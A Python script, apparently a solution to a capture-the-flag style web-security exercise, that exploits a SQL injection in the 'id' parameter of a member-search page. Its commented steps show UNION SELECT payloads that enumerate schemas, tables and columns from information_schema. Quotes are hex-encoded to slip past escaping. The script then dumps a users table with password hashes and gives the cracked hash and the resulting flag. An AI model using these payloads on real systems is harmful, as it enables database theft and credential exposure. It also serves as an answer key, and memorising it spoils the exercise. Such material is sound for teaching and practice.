# /usr/bin/env python3

# FOR PAGE: /?page=member

# NEEDS:
# pip install beautifulsoup4 requests

import requests
from bs4 import BeautifulSoup
import sys

# HELPER FUNCTIONS -----------------------------------------------------------------------------------------------------
"""
Usage:
    "Member_Sql_Injection" to hex -> convert_to_hex("Member_Sql_Injection") -> 0x4d656d6265725f53716c5f496e6a656374696f6e
"""
to_hex = lambda x="": f"0x{x.encode('utf-8').hex()}"

# CHANGE THESE VALUES---------------------------------------------------------------------------------------------------

HOST_IP = "10.12.250.191"

# WALK THROUGH THE RESULTS -------------------------------------------------------------------------------------------
"""
# STEP 1: GET THE SCHEMA NAMES
# result -> |information_schema|,|Member_Brute_Force|,|Member_Sql_Injection|,|Member_guestbook|,|Member_images|,|Member_survey|
query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata;--"
"""

"""
# STEP 2: GET THE TABLE NAMES FOR THE SCHEMA Member_Sql_Injection
# result: |users|
schema = convert_to_hex("Member_Sql_Injection")
query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema={schema}"
"""

"""
# STEP 3: GET THE COLUMN NAMES FOR THE TABLE users
# result: |user_id|,|first_name|,|last_name|,|town|,|country|,|planet|,|Commentaire|,|countersign|
table = convert_to_hex("users")
query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name={table}"
"""

"""
# STEP 4: GET THE VALUES YOU WANT TO SEARCH FOR

query = (
        "1 UNION SELECT NULL, GROUP_CONCAT("
        + to_hex("(") + ","
        + to_hex('"user_id: ') + ",user_id," + dquote + ","
        + to_hex(',"first_name: ') + ",first_name," + dquote + ","
        + to_hex(',"last_name: ') + ",last_name," + dquote + ","
        + to_hex(',"town: ') + ",town," + dquote + ","
        + to_hex(',"country: ') + ",country," + dquote + ","
        + to_hex(',"planet: ') + ",planet," + dquote + ","
        + to_hex(',"Commentaire: ') + ",Commentaire," + dquote + ","
        + to_hex(',"countersign: ') + ",countersign," + dquote + ","
        + to_hex(")")
        + ") FROM Member_Sql_Injection.users"
)
# result: ("user_id: 1","first_name: one","last_name: me","town: Paris ","country: France","planet: EARTH","Commentaire: Je pense, donc je suis","countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),("user_id: 2","first_name: two","last_name: me","town: Helsinki","country: Finlande","planet: Earth","Commentaire: Aamu on iltaa viisaampi.","countersign: 60e9032c586fb422e2c16dee6286cf10"),("user_id: 3","first_name: three","last_name: me","town: Dublin","country: Irlande","planet: Earth","Commentaire: Dublin is a city of stories and secrets.","countersign: e083b24a01c483437bcf4a9eea7c1b4d"),("user_id: 5","first_name: Flag","last_name: GetThe","town: 42","country: 42","planet: 42","Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !","countersign: 5ff9d0165b4f92b14994e5c685cdce28")
query_result = [
    ("user_id: 1", "first_name: one", "last_name: me", "town: Paris ", "country: France", "planet: EARTH",
     "Commentaire: Je pense, donc je suis", "countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),
    ("user_id: 2", "first_name: two", "last_name: me", "town: Helsinki", "country: Finlande", "planet: Earth",
     "Commentaire: Aamu on iltaa viisaampi.", "countersign: 60e9032c586fb422e2c16dee6286cf10"),
    ("user_id: 3", "first_name: three", "last_name: me", "town: Dublin", "country: Irlande", "planet: Earth",
     "Commentaire: Dublin is a city of stories and secrets.", "countersign: e083b24a01c483437bcf4a9eea7c1b4d"),
    ("user_id: 5", "first_name: Flag", "last_name: GetThe", "town: 42", "country: 42", "planet: 42",
     "Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !",
     "countersign: 5ff9d0165b4f92b14994e5c685cdce28")
]
"""

"""
# LAST STEP?: DECRYPT THE COUNTERSIGN, lowercase it and ENCRYPT IT WITH SHA256 TO GET THE PASSWORD
# COUNTERSIGN OF LAST ELEMENT: MD5: 5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo
# fortytwo encrypted SHA256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
"""
# -----------------------------------------------------------------------------------------------------------------------

schema = to_hex("Member_Sql_Injection")
table = to_hex("users")

# TODO: CHANGE THIS QUERY FOR YOUR NEEDS
# The quotes are escaped by the backend, so to use a string as a value, we need to convert it to a hexadecimal value with the convert_to_hex function.
dquote = to_hex('"')
query = (
        "1 UNION SELECT NULL, GROUP_CONCAT("
        + to_hex("(") + ","
        + to_hex('"user_id: ') + ",user_id," + dquote + ","
        + to_hex(',"first_name: ') + ",first_name," + dquote + ","
        + to_hex(',"last_name: ') + ",last_name," + dquote + ","
        + to_hex(',"town: ') + ",town," + dquote + ","
        + to_hex(',"country: ') + ",country," + dquote + ","
        + to_hex(',"planet: ') + ",planet," + dquote + ","
        + to_hex(',"Commentaire: ') + ",Commentaire," + dquote + ","
        + to_hex(',"countersign: ') + ",countersign," + dquote + ","
        + to_hex(")")
        + ") FROM Member_Sql_Injection.users"
)
# result: ("user_id: 1","first_name: one","last_name: me","town: Paris ","country: France","planet: EARTH","Commentaire: Je pense, donc je suis","countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),("user_id: 2","first_name: two","last_name: me","town: Helsinki","country: Finlande","planet: Earth","Commentaire: Aamu on iltaa viisaampi.","countersign: 60e9032c586fb422e2c16dee6286cf10"),("user_id: 3","first_name: three","last_name: me","town: Dublin","country: Irlande","planet: Earth","Commentaire: Dublin is a city of stories and secrets.","countersign: e083b24a01c483437bcf4a9eea7c1b4d"),("user_id: 5","first_name: Flag","last_name: GetThe","town: 42","country: 42","planet: 42","Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !","countersign: 5ff9d0165b4f92b14994e5c685cdce28")
query_result = [
    ("user_id: 1", "first_name: one", "last_name: me", "town: Paris ", "country: France", "planet: EARTH",
     "Commentaire: Je pense, donc je suis", "countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),
    ("user_id: 2", "first_name: two", "last_name: me", "town: Helsinki", "country: Finlande", "planet: Earth",
     "Commentaire: Aamu on iltaa viisaampi.", "countersign: 60e9032c586fb422e2c16dee6286cf10"),
    ("user_id: 3", "first_name: three", "last_name: me", "town: Dublin", "country: Irlande", "planet: Earth",
     "Commentaire: Dublin is a city of stories and secrets.", "countersign: e083b24a01c483437bcf4a9eea7c1b4d"),
    ("user_id: 5", "first_name: Flag", "last_name: GetThe", "town: 42", "country: 42", "planet: 42",
     "Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !",
     "countersign: 5ff9d0165b4f92b14994e5c685cdce28")
]

# COUNTERSIGN OF LAST ELEMENT: 5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo
# fortytwo encrypted with sha256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


# a list of columns indexes to show. 0 - first column, 1 - second column. These are the only options for now.
SHOW_N_COLUMNS = [0, 1]

# -----------------------------------------------------------------------------------------------------------------------
page_default_params = {
    "page": "member",
    "Submit": "Submit",
    "id": query
}

response = requests.get(f'http://{HOST_IP}/', params=page_default_params)

soup = BeautifulSoup(response.text, 'html.parser')

content = soup.find("div", {"class": "container"})
if content is None:
    print("No content found")
    exit(1)

# remove the "Search member by ID:"
extra_table = content.find("table")
if extra_table is not None:
    extra_table.decompose()
else:
    print("No extra table found")
    print(content.prettify())
    exit(1)
# print(content.prettify())


# all results
results = content.find_all("pre")

if len(results) == 0:
    print("No results found")
    exit(1)

formatted_results = []

# clean up the results info
for item in results:
    # print(item.prettify())

    # split by <br/>
    info = [i for i in item.stripped_strings]

    first_column = info[1].replace("First name: ", "")
    second_column = info[2].replace("Surname :", "")
    formatted_results.append((first_column, second_column))

max_size = max([max([len(j) for j in i]) for i in formatted_results])
beautify = True
if len(sys.argv) > 1:
    beautify = sys.argv[1] != "clean"
if beautify:
    for i, item in enumerate(formatted_results):
        for j in SHOW_N_COLUMNS:
            prefix = f"[{i + 1}][COL_{j}]:"
            pad = 69 - max_size - len(prefix)
            pad = pad if pad > 0 else 0
            print(f"{prefix}{' ' * (pad + 1)}|{item[j]}|")
else:
    for i, item in enumerate(formatted_results):
        for j in SHOW_N_COLUMNS:
            print(f"{item[j]}")
